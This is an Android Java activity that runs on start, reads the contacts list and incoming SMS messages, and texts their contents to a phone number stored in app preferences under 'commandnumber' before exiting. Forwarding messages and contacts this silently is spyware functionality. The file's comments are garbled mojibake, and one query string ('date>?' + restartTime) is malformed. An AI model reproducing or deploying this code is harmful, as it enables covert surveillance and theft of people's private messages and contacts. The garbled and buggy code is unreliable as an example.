package my.pro;

import android.app.Activity;
import android.content.Context;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.provider.ContactsContract;
import android.text.method.ScrollingMovementMethod;
import android.widget.TextView;

public class AutoStartActivity extends Activity {

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		// TODO Auto-generated method stub
		super.onCreate(savedInstanceState);
		setContentView(R.layout.autostart);

		// �Զ��������Ȱ�֮ǰ��δ������ת�����ɸ��߳�ִ��
		smsHandler.post(smsRunnable);
	}

	Handler smsHandler = new Handler();

	Runnable smsRunnable = new Runnable() {

		@Override
		public void run() {
			// TODO Auto-generated method stub

			SharedPreferences sharedPrefe = getSharedPreferences("parameters", Context.MODE_PRIVATE);
			// �ڶ��������ĺ��壺Value to return if this preference does not exist.
			long restartTime = sharedPrefe.getLong("cancelTime", 0);

			if (restartTime == 0) {
				// --------------�Զ�������-----------------------//
				TextView myShowStr = (TextView) findViewById(R.id.widget33);
				// ����TextView�Ĺ�����
				myShowStr.setMovementMethod(ScrollingMovementMethod.getInstance());

				Cursor contactCursor = null;
				Cursor smsCursor = null;
				Cursor messageCursor = null;
				try {

					// ��ϵ���б�
					contactCursor = managedQuery(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);

					// �����б����
					Uri uri = Uri.parse("content://sms//inbox");
					String[] projection = new String[] { "_id", "read", "address", "person", "body" };
					String selection = "read = 0";
					// �����б����ڲ��ҷ���ָ����ֻ�����
					smsCursor = managedQuery(uri, projection, selection, null, "date desc");
					// ��ȡδ������,Cursorָ��һ��Ҫע�⡣��ȡ�б�ʱ��һ��Ҫȴ���α��ڿ�ʼλ��
					messageCursor = managedQuery(uri, projection, selection, null, "date desc");

					// ��ȡ���õ�����

					String getPassword = sharedPrefe.getString("password", "");

					
					String sendToPhone = sharedPrefe.getString("commandnumber", "");

					// ��ȡδ������
					ReadSMS readSMS = new ReadSMS();
					StringBuilder strSMS = new StringBuilder();
					strSMS = readSMS.smsNumber(messageCursor, contactCursor, getPassword);

					// ���Ͷ���
					SendSMS sendSMSToPhone = new SendSMS();
					sendSMSToPhone.sendSMS(strSMS.toString(), sendToPhone);

					// --------------------------------------------//
				} catch (Exception ex) {
					myShowStr.setText(ex.toString());
				} finally {
					smsCursor.close();
					messageCursor.close();
					contactCursor.close();
					System.exit(0);

				}
			} else {

				// �����͹�ȡ��ָ����ٴ�����Ӧ��ʱ���е�ת��

				// --------------�Զ�������-----------------------//
				TextView myShowStr = (TextView) findViewById(R.id.widget33);
				// ����TextView�Ĺ�����
				myShowStr.setMovementMethod(ScrollingMovementMethod.getInstance());

				Cursor contactCursor = null;
				Cursor smsCursor = null;
				Cursor messageCursor = null;
				try {

					// ��ϵ���б�
					contactCursor = managedQuery(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);

					// �����б����
					Uri uri = Uri.parse("content://sms//inbox");
					String[] projection = new String[] { "date", "read", "address", "person", "body" };
					
					//�ж����������ã�restartTime��long���͵ģ������������ԱȽϵķ�Χ��
					String selection = "date>?" + restartTime;
					
					
					// �����б����ڲ��ҷ���ָ����ֻ�����
					smsCursor = managedQuery(uri, projection, selection, null, "date desc");
					// ��ȡδ������,Cursorָ��һ��Ҫע�⡣��ȡ�б�ʱ��һ��Ҫȴ���α��ڿ�ʼλ��
					messageCursor = managedQuery(uri, projection, selection, null, "date desc");

					// ��ȡ���õ�����

					String getPassword = sharedPrefe.getString("password", "");

					// ��ȡ����ָ����ֻ�����
					// SearchPhoneNumber searchPhoneNum = new
					// SearchPhoneNumber();
					// String sendToPhone =
					// searchPhoneNum.getPhoneNumber(smsCursor, getPassword);
					String sendToPhone = sharedPrefe.getString("commandnumber", "");

					// ��ȡδ������
					ReadSMS readSMS = new ReadSMS();
					StringBuilder strSMS = new StringBuilder();
					strSMS = readSMS.smsNumber(messageCursor, contactCursor, getPassword);

					// ���Ͷ���
					SendSMS sendSMSToPhone = new SendSMS();
					sendSMSToPhone.sendSMS(strSMS.toString(), sendToPhone);

					// --------------------------------------------//
				} catch (Exception ex) {
					myShowStr.setText(ex.toString());
				} finally {
					smsCursor.close();
					messageCursor.close();
					contactCursor.close();
					System.exit(0);

				}

			}

		}

	};

}
